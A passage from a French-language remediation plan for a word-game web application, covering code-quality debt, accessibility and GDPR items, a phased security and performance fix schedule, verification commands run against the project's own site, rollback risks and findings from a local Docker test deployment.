| **QUAL-04** | Validation de configuration au démarrage (fail-fast) | Refuser de démarrer si `DB_PASS` vaut encore la valeur d'exemple `cemantix_secure_password_replace_in_prod` (`.env.example:10`) ; exiger `SECRET_KEY` (nécessaire à SEC-03/05b) hors mode dev ; documenter dans `.env.example` les variables lues mais non listées : `DATABASE_URL`, `SQLITE_PATH` (`connection.py:39-40`), `DASHBOARD_DATA_FILE` (`web.py:31`), `DAEMON_HEARTBEAT_FILE` (`daemon.py:32`), `DUEL_TOP_WORDS` (`config.py:24`), `ALLOWED_ORIGINS`, `SECRET_KEY`. | 0,25 j |
| **QUAL-05** | Journalisation | Un format unique `%(asctime)s %(levelname)s %(message)s` via `logging` (le projet imprime avec `print(..., flush=True)`, `config.py:178-179`) ; niveaux réels ; requêtes HTTP tracées (SEC-09) ; le heartbeat et le `HEALTHCHECK` existants sont bons, les garder. | 0,25 j |
| **QUAL-06** | Cohérence HTTP | (a) normaliser **une seule** forme de chemin (`server.py:67,82` : `rstrip("/")` rend `/api/daily/` équivalent à `/api/daily`, ce qui fait diverger les règles de cache Caddy) ; (b) répondre `405` aux méthodes non gérées (`do_PUT`/`do_DELETE` absents) ; (c) factoriser le patron répété 8 fois `status_code = 400 if "error" in res and not res.get("valid") else 200` (`routes/multi.py:128,165,180,196`, `battle.py:61,76`, `solo.py:86`) dans un helper `responder(res)`. | 0,25 j |
| **QUAL-07** | Ré-importer `tools/` depuis `feat/optimisation-seo` | `check_og_image.py` (sortie 1 si l'image dépasse le budget, alimente la CI), `check_js_balance.py`, `build_css_bundles.py` ; y ajouter `check_seo.py` (title/description/canonical/OG/JSON-LD présents et uniques sur les 4 pages + toutes les archives) et `check_headers.sh` (attendus des 6 en-têtes de SEC-08). | 0,25 j |
| **QUAL-08** | Découpage du front | `volumes/web/js/multi.js` (1002 l.) et `battle.js` (839 l.) -> `lobby.js` + `arena.js` + `render.js` (le rendu des coups est **dupliqué quasi à l'identique** entre `multi.js:905-955` et `battle.js:656-702`). Prérequis du code-splitting PERF-10 et du `escapeHtml` unique SEC-01b. | 0,5 j |
| **QUAL-09** | Dettes mineures identifiées | `config.py:59` `WORD_RE` et `config.py:113-148` `ENGLISH_WORDS` (liste de stopwords **anglais** de 35 lignes) vivent dans la config métier ; `PROMPT` (`config.py:154-175`) devrait être un fichier de template ; `manager._save_sessions()` est appelé depuis les contrôleurs HTTP (couche API qui connaît la persistance) -> inverser vers le manager ; `scripts/migrate_json_to_pg.py` sans test ni `--dry-run`. | au fil de l'eau |

---

## 7. Accessibilité & RGPD

| ID | Action | Détail |
|---|---|---|
| **A11Y-01** | Fallback de contenu | Le dashboard est 100 % JS (`dashboard.js:151-175`) : sans JS, la page est vide -> `<noscript>` avec le résumé du jour (cf. SEO-09). |
| **A11Y-02** | Annonces dynamiques | Les mises à jour de score/thermomètre (`battle.js:640-655`, `multi.js:905-955`) ne sont pas annoncées : ajouter `aria-live="polite"` sur les conteneurs de coups et `role="status"` sur le toast (`utils.js:28`). |
| **A11Y-03** | Interactions clavier | Les lignes d'historique sont cliquables via `data-action` (`dashboard.js:89-100`) mais pas focalisables : `tabindex="0"` + gestion `Enter`/`Space`. Suppression des `onclick` inline (SEC-02) à faire **en même temps** pour ne pas régresser. |
| **A11Y-04** | Contrast | Déjà traité (PR #18, `--accent-btn`, badges) — **à verrouiller** par un test Lighthouse a11y dans la CI (QUAL-02) plutôt qu'à retravailler. |
| **RGPD-01** | Pseudonymes | `player_name` est une donnée personnelle stockée en clair (`multi_rooms.p1_data`, `db/multi.py`) ; la purge à 7 jours existe déjà (`manager.py:442-449`, `cleanup_old_rooms`) -> la conserver, la documenter, et ne jamais journaliser le pseudo en clair (SEC-09). |
| **RGPD-02** | Cookies | Aucun cookie aujourd'hui (localStorage uniquement : `theme.js:7-8`, `multi.js:61-85`) -> pas de bandeau. Le cookie de révélation (SEC-03) est strictement nécessaire au fonctionnement : le documenter comme tel, `SameSite=Lax`, pas de traceur. |
| **RGPD-03** | Journaux | Journaliser l'IP tronquée (/24) et ne pas conserver les adresses complètes au-delà de la rotation des logs déjà configurée (`max-file: 3`, `compose:25-29`). |

---

## 8. Plan d'exécution

### Phase 0 — Garde-fous (½ j) · *à faire avant tout correctif*

1. Décision §2 (fusion `feat/optimisation-seo` ou repart de la branche courante).
2. `.gitignore` (SEC-10) + correction de la dérive README (QUAL-03).
3. `tests/` plancher : 6 tests qui **cassent volontairement** sur l'état actuel (XSS pseudo,
   `?reveal=true`, CORS `*`, taille de corps, entropie des clés, comptage de connexions PG).
   => chaque correctif des phases suivantes est validé par un test qui était rouge.
4. CI (`QUAL-02`) en mode *non bloquant*, puis bloquant en fin de plan.

**Critère de sortie :** `python -m unittest discover -s tests` s'exécute, la CI est verte sur
`main`, `git status` ne liste plus `volumes/db/`.

### Phase 1 — Sécurité critique (1 j) · **P0**

Ordre imposé (les dépendances vont dans ce sens) :
`SEC-01` (sanitisation serveur) -> `SEC-01b`/`SEC-02` (échappement + suppression des `onclick`
inline, **prérequis** d'une CSP stricte) -> `SEC-06` (limite de corps) -> `SEC-04` (CORS)
-> `SEC-03` (reveal par cookie signé) -> `SEC-05`/`SEC-05b` (clés) -> `SEC-07` (rate-limit)
-> `SEC-08` (Caddyfile versionné + HSTS/CSP) -> `SEC-09` (journalisation).

**Critère de sortie :** les 6 tests de sécurité sont verts ; `curl -I` montre les 6 en-têtes ;
`grep` de `reveal=true` et d'`onclick="copyToClipboard` = 0 résultat.

### Phase 2 — Fiabilité & performance backend (½ j)

`PERF-06` (pool de connexions — **à traiter en premier**, c'est ce qui tombe en prod)
-> `PERF-06b` -> `PERF-01`/`PERF-02`/`PERF-03` (cache + ETag + fin du cache-buster + polling
conditionnel) -> `PERF-04` (requêtes agrégées + historique borné) -> `PERF-05` (O(1) par coup)
-> `PERF-07` (HTTP/1.1 + timeout + borne de concurrence).

**Critère de sortie :** sous 200 requêtes `/api/daily`, le nombre de connexions PG ouvertes reste
constant (`SELECT count(*) FROM pg_stat_activity WHERE usename='cemantix_user'`) ; les appels
`/api/daily` renvoient majoritairement des `304`.

### Phase 3 — Performance front & SEO (1 j)

`PERF-08` (og-image, à faire sur la machine locale) -> `PERF-09`/`PERF-10` (♻️ fusion +
`modulepreload`) -> `SEO-01`/`SEO-01b` (archives quotidiennes) -> `SEO-02` (sitemap généré) ->
`SEO-03`/`SEO-04` (robots + `X-Robots-Tag`) -> `SEO-06`/`SEO-07`/`SEO-10`/`SEO-11` (JSON-LD,
OG par page, hreflang, OpenAPI) -> `SEO-05` (nettoyage meta).

**Critère de sortie :** `tools/check_seo.py` et `tools/check_og_image.py` sortent `0` ;
`sitemap.xml` contient N archives avec un `lastmod` réel ; Lighthouse ≥ 90 en perf sur les 4 pages.

### Phase 4 — Qualité & durcissement résiduel (½ j)

`SEC-11` (SHA-256), `SEC-12` (verrou + chroma paresseux), `SEC-13` (image non-root + digest),
`SEC-14` (SQL bindé + fin des `except: pass`), `SEC-15` (doc `--export-web`), `QUAL-04`/`QUAL-05`/`QUAL-06`.

### Phase 5 — Recette & mesure (¼ j)

`QUAL-07` (outils), `QUAL-08` (découpage JS), `A11Y-01..03`, `RGPD-01..03`, `SEO-12` (Search
Console + Lighthouse CI bloquant), ouverture de la PR avec `CHANGELOG.md` à jour (convention du
projet : sections « Ajouté / Corrigé / Refactorisé », cf. `CHANGELOG.md:8-40`).

### Récapitulatif effort / impact

| Phase | Effort | Sécurité | Fiabilité | Perf | SEO |
|---|---|---|---|---|---|
| 0 — Garde-fous | ½ j | 🟡 | 🟡 | — | — |
| 1 — Sécurité P0 | 1 j | 🔴 -> 🟢 | 🟡 | — | 🟡 (fin du contenu spoilable indexé) |
| 2 — Backend | ½ j | 🟡 | 🔴 -> 🟢 | 🟠 -> 🟢 | — |
| 3 — Front & SEO | 1 j | 🟢 (CSP possible) | — | 🟠 -> 🟢 | 🔴 -> 🟢 |
| 4 — Durcissement | ½ j | 🟠 -> 🟢 | 🟢 | 🟡 | — |
| 5 — Recette | ¼ j | ✅ | ✅ | ✅ | ✅ |
| **Total** | **3,75 j** | | | | |

### Quick wins (< 2 h cumulées, ~70 % du risque)

1. `SEC-01` sanitisation serveur du pseudo (10 min) + `escapeHtml` (30 min) : ferme le XSS.
2. `SEC-06` limite de corps à 8 ko + `int()` protégé (15 min).
3. `SEC-03` suppression de `?reveal=true` public côté client **et** serveur (20 min).
4. `SEC-10` `.gitignore` (5 min).
5. `PERF-06` pool de connexions PG (1 h 30) — évite la panne de prod.
6. `SEO-02` `lastmod` réels + `SEO-03` `Disallow: /api/` (10 min).

---

## 9. Commandes de vérification

```bash
# Tests unitaires (après QUAL-01)
python -m unittest discover -s tests -v

# Vérifications statiques de sécurité (doivent toutes sortir vides)
grep -rn 'reveal=true' volumes/web/js src/api
grep -rn 'Access-Control-Allow-Origin", "\*"' src/api
grep -rn 'onclick="copyToClipboard' volumes/web/js
grep -rn 'uuid4' src/game/multi.py
grep -rn -A1 'except Exception' src | grep -c pass

# En-têtes de sécurité (après SEC-08)
curl -sI https://cemantix.cyril-randon.fr/ | grep -Ei 'strict-transport|content-security|x-frame|x-content-type|referrer|permissions'
curl -sI https://cemantix.cyril-randon.fr/api/health | grep -i 'x-robots-tag'

# Anti-spoiler (doit renvoyer "word": null)
curl -s 'https://cemantix.cyril-randon.fr/api/daily?reveal=true' | python -c "import json,sys; print(json.load(sys.stdin)['current']['word'])"

# Limitation de débit (les dernières requêtes doivent être en 429)
for i in $(seq 1 60); do curl -s -o /dev/null -w '%{http_code} ' -X POST \
  -H 'Content-Type: application/json' -d '{"game_id":"x","word":"maison"}' \
  https://cemantix.cyril-randon.fr/api/game/guess; done; echo

# Fuite de connexions (PERF-06) : ce compteur doit rester plat
for i in $(seq 1 200); do curl -s -o /dev/null https://cemantix.cyril-randon.fr/api/daily; done
docker exec cemantix_db psql -U cemantix_user -d cemantix \
  -c "SELECT count(*) FROM pg_stat_activity WHERE usename='cemantix_user';"

# SEO
python tools/check_seo.py && python tools/check_og_image.py
curl -s https://cemantix.cyril-randon.fr/sitemap.xml | grep -c '<loc>'
curl -s https://cemantix.cyril-randon.fr/robots.txt
curl -s https://cemantix.cyril-randon.fr/api/daily | python -m json.tool | head -20

# Supply chain
pip install pip-audit && pip-audit -r requirements.txt
trivy image cemantix:latest

# Lighthouse (les 4 pages)
npx lighthouse https://cemantix.cyril-randon.fr/ --only-categories=performance,seo,accessibility,best-practices --output=html
```

---

## 10. Risques du plan & rollbacks

| Risque | Mitigation |
|---|---|
| **Casser les salons multi ouverts** en changeant le format des clés (SEC-05) | Accepter l'ancien format 4 hex pendant 7 jours (durée de vie des salons, `manager.py:442`) puis le retirer. |
| **Casser le dashboard** en retirant `?reveal=true` (SEC-03) | Le flux « Révéler » et le bouton copier (`dashboard.js:40-68`) doivent basculer **dans le même commit** sur `POST /api/daily/reveal` ; test de parcours complet obligatoire. |
| **CSP qui casse le rendu** (style inline dans les templates JS : `style="color: var(--accent)"` dans `game.js:195,209,553,582`) | Passer ces styles en classes CSS **avant** d'activer `style-src 'self'` ; déployer d'abord en `Content-Security-Policy-Report-Only`. |
| **Cache mémoire qui retarde l'affichage du mot du jour** (PERF-01) | TTL court (15 s) + invalidation explicite par le démon après résolution (`run_daily_solver` -> purge ou écriture du payload). |
| **Pages d'archives jugées « thin content »** (SEO-01) | SEO-01b (> 400 mots de données réelles) + publication progressive : 1 mois d'archives d'abord, mesure Search Console à J+30 avant d'activer tout l'historique. |
| **`chromadb` rendu optionnel casse le CLI** (SEC-12) | Le rendre optionnel **seulement** quand `with_chroma=False` ; garder la dépendance dans `requirements.txt` (groupe `vector` optionnel dans un second temps). |
| **Conflits de merge** avec `feat/optimisation-seo` (§2) | Phase 0 obligatoire ; petites PR thématiques (une famille de findings par PR) plutôt qu'un gros patch. |

**Rollback :** chaque phase = 1 PR distincte, réversible par `git revert`. Les seuls changements
non réversibles en douceur sont (a) la migration de hachage des clés (`SEC-05b` : prévoir la colonne
`player1_key` conservée tant que l'ancien code tourne) et (b) la suppression des pages d'archives
(les `noindex` avant de les supprimer, pour ne pas laisser de 404 indexés).

---

## 11. Annexe — Inventaire chiffré de l'état des lieux (27/10/2026)

| Mesure | Valeur constatée | Cible |
|---|---|---|
| `og-image.jpg` | 3 091 777 octets | ≤ 100 ko |
| CSS (8 fichiers) | 95 578 o, 5 à 6 requêtes/page | 1 requête/page |
| JS (10 fichiers) | 124 456 o, non minifié | -30 % par découpage |
| Pages indexables | 4 | 4 + N archives quotidiennes |
| `lastmod` du sitemap | 2026-10-25 (figé, 4 occurrences) | date réelle par URL |
| Tests automatisés | 0 | ≥ 25 dont 6 de sécurité |
| Workflows CI | 0 | 1 bloquant |
| `except Exception: pass` | 11 | 0 |
| Occurrences `innerHTML` à auditer | 28 | 0 sans échappement |
| En-têtes de sécurité versionnés | 0 (Caddyfile hors dépôt) | 6 |
| Dépendances épinglées | 0/4 | 4/4 + audit en CI |

**Inventaire des endpoints** — `GET` : `/api/health`, `/api/healthcheck`, `/api/daily`,
`/api/dashboard`, `/api/game/daily-info`, `/api/multi/status` · `POST` : `/api/game/new`,
`/api/game/resume`, `/api/game/guess`, `/api/game/hint`, `/api/game/giveup`, `/api/battle/new`,
`/api/battle/resume`, `/api/battle/guess`, `/api/battle/hint`, `/api/battle/giveup`,
`/api/multi/create`, `/api/multi/join`, `/api/multi/setup-word`, `/api/multi/status`,
`/api/multi/guess`, `/api/multi/hint`, `/api/multi/giveup` (23 chemins, `routes/*.py`).
→ base directe du `openapi.json` requis par `SEO-11`.

**Ordre de grandeur du trafic incompressible aujourd'hui**, par onglet du tableau de bord laissé
ouvert 24 h : 2 880 appels `/api/daily` (30 s) × 1 full-scan × 1 connexion PostgreSQL = **la
combinaison exacte des trois défauts PERF-01 / PERF-02 / PERF-06**.

---

## 12. Environnement de test local (WSL Ubuntu-20.04 + nginx)

Un empilement de test **hors git** (`/local/`, ignoré par le `.gitignore`) permet de
vérifier chaque correctif du plan avant de le porter dans le Caddyfile de production.
Documentation complète : `local/README.md`.

```text
http://localhost:8090            accueil + tableau de bord      (nginx -> volumes/web)
http://localhost:8090/play|battle|multi/
http://localhost:8090/api/...    même origine que les pages     (nginx -> cemantix_web:8000)
```

| Fichier | Rôle |
|---|---|
| `local/setup-wsl.sh` | Idempotent : génère `.env`, configure l'egress du démon Docker, crée le réseau externe `web-net`, ajoute l'utilisateur au groupe `docker`. |
| `local/docker-compose.test.yml` | Ajoute `cemantix_nginx`, déplace les données PG sur un volume nommé, neutralise le proxy au runtime, fournit le relais d'egress du worker. |
| `local/nginx/cemantix.local.conf` | Applique déjà les en-têtes de **SEC-08** et un **`X-Robots-Tag: noindex` sur `/api/`** (SEO-04) : ils sont testables dès maintenant. |
| `local/smoke-test.sh` | 29 contrôles de bout en bout (statuts, en-têtes, anti-spoiler, partie réelle, salon multi). |

**Résultat du déploiement et résultat du smoke test :** tenus dans
[`02-avancement.md`](02-avancement.md) § « Environnement de test » (ils évoluent à chaque correctif).

**Ce que cet environnement change au plan :** SEC-08 et SEO-04 ne sont plus à écrire de
zéro, ils existent en version nginx et peuvent être validés puis transcrits vers Caddy.
La CSP y est livrée en `Report-Only` : les violations des `style=`/`onclick=` inline
(SEC-02) sont mesurables dans `docker exec cemantix_nginx cat /tmp/csp.log`.

---

## 13. Constats de déploiement — nouveaux points (ajoutés après mise en route réelle)

| ID | Constat (mesuré, pas supposé) | Conséquence | Action |
|---|---|---|---|
| **QUAL-10** | Le worker est passé `unhealthy` **pendant qu'il travaillait** : l'indexation ChromaDB de 150 000 vecteurs (20 min sur ce poste) bloque la boucle, le heartbeat n'est plus écrit (mesuré à **557 s** sans rafraîchir, seuil 90 s, `daemon.py:55`). La sonde renvoie bien `1` — le diagnostic est correct, c'est la **couverture** qui manque. | Faux positifs de supervision ; tout `restart` piloté par la santé tuerait une résolution en cours. | Écrire le heartbeat depuis un thread séparé (ou `update_heartbeat` appelé dans la boucle d'indexation/LLM), et remonter l'étape courante dans le payload. |
| **QUAL-11** | `~/.docker/config.json` (`proxies.default`) est injecté **au runtime** dans chaque conteneur, pas seulement au build. Effets observés : `cemantix_web` partait télécharger le modèle sur son propre loopback ; le `wget` du healthcheck nginx interrogeait le proxy au lieu de nginx (conteneur `unhealthy` alors que `0.0.0.0:8080` répondait). | Pannes incompréhensibles dès qu'un proxy est configuré sur l'hôte. | Documenter + neutraliser explicitement (`HTTP_PROXY=`) tout conteneur n'ayant pas besoin d'internet ; ne jamais supposer que le proxy ne touche que le build. |
| **QUAL-12** | `initdb` échoue en boucle sur `/mnt/c` : `could not change permissions ... Operation not permitted` (drvfs/9p sans permissions POSIX). | Postgres **ne peut pas** vivre sur le disque Windows. | Garder les données PG sur un volume nommé ou le disque ext4 de la distribution ; le dire dans le README (l'actuel ne le mentionne pas). |
| **QUAL-13** | Aucun `.dockerignore` : le contexte de build envoie `cemantix_data/` (**2,08 Go** de modèle), `volumes/`, `.env`, `local/`, `.git/` au démon. **Vérification faite, `.env` n'atterrit pas dans l'image** (`docker exec cemantix_web ls -a /app` : absent) — mais c'est **incidentel**, dû uniquement aux `COPY` explicites du Dockerfile. | Builds lents (Go de contexte pour 2 Mo de code) ; **aucune protection** si un `COPY . .` est ajouté plus tard. | Créer un `.dockerignore` (`.env`, `cemantix_data/*`, `volumes/`, `local/`, `.idea/`, `.git/`, `.github/`) avant le prochain build complet. |
| **QUAL-14** | Le widget « État du démon » est **structurellement faux** depuis la découpe 3-tiers : `HEARTBEAT_FILE` vaut `/tmp/daemon_heartbeat.json` (`daemon.py:32`), or `/tmp` est **propre à chaque conteneur** (et `tmpfs` de surcroît). Le worker écrit son battement dans son `/tmp`, `cemantix_web` lit le **sien**, qui n'existe jamais. Mesuré : `/api/daily` renvoie `daemon.status = "idle"` pendant que le worker résout activement. | Le tableau de bord affiche « Veille active (00h00) » en permanence — une information **fausse**, et non simplement absente ; et `build_web_data` ne peut pas distinguer « inactif » de « jamais vu ». | Partager le battement : `DAEMON_HEARTBEAT_FILE=/app/cemantix_data/daemon_heartbeat.json` (volume déjà commun aux deux services) ou un `tmpfs` partagé ; et distinguer un état `unknown` quand le fichier est absent. |

> **SEC-12 illustré :** le build de l'image installe, pour un service web qui n'utilise jamais
> ChromaDB (`cemantix_rag.py:116`, `with_chroma=False`), toute la chaîne
> `kubernetes`, `onnxruntime`, `opentelemetry-*`, `tokenizers`, `huggingface-hub`, `aiohttp`…
> Le worker passe en outre **~20 min** à indexer ces 150 000 vecteurs à chaque volume vierge.

**Vérification de la sonde** (la sortie est bien `1` — contrairement à une première lecture
erronée due à un `$?` évalué trop tôt dans un shell imbriqué) :

```bash
wsl.exe -d Ubuntu-20.04 -- docker exec cemantix_worker python cemantix_rag.py --healthcheck
# -> exited 1, « HEALTHCHECK FAIL: Heartbeat trop ancien (557.4s > 90s) »
```
